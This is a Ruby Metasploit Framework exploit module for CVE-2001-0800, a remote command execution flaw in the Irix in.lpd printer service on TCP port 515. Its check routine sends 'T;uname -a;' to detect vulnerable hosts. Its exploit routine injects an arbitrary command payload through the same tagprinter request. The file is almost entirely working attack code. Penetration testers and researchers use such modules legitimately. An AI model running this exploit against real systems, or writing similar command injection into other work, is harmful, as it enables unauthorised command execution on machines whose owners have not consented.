##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Irix LPD tagprinter Command Execution',
			'Description'    => %q{
				This module exploits an arbitrary command execution flaw in
				the in.lpd service shipped with all versions of Irix.		
			},
			'Author'         => [ 'optyx', 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					['CVE', '2001-0800'],
					['OSVDB', '8573'],
					['URL',   'http://www.lsd-pl.net/code/IRIX/irx_lpsched.c'],
				],
			'Privileged'     => false,
			'Platform'       => ['unix', 'irix'],
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					'Space'       => 512,
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic telnet',
						}
				},		
			'Targets'        => 
				[
					[ 'Automatic Target', { }]
				],
			'DisclosureDate' => 'Sep 01 2001',
			'DefaultTarget' => 0))
			
			register_options(
				[
					Opt::RPORT(515)
				], self.class)
	end

	def check
		connect
		sock.put("T;uname -a;\n")
		resp = sock.get_once
		disconnect
		
		if (resp =~ /IRIX/)
			print_status("Response: #{resp.strip}")
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end
	
	def exploit
		connect
		sock.put("T;#{payload.encoded};\n")
		handler
		print_status("Payload: #{payload.encoded}")
	end

end
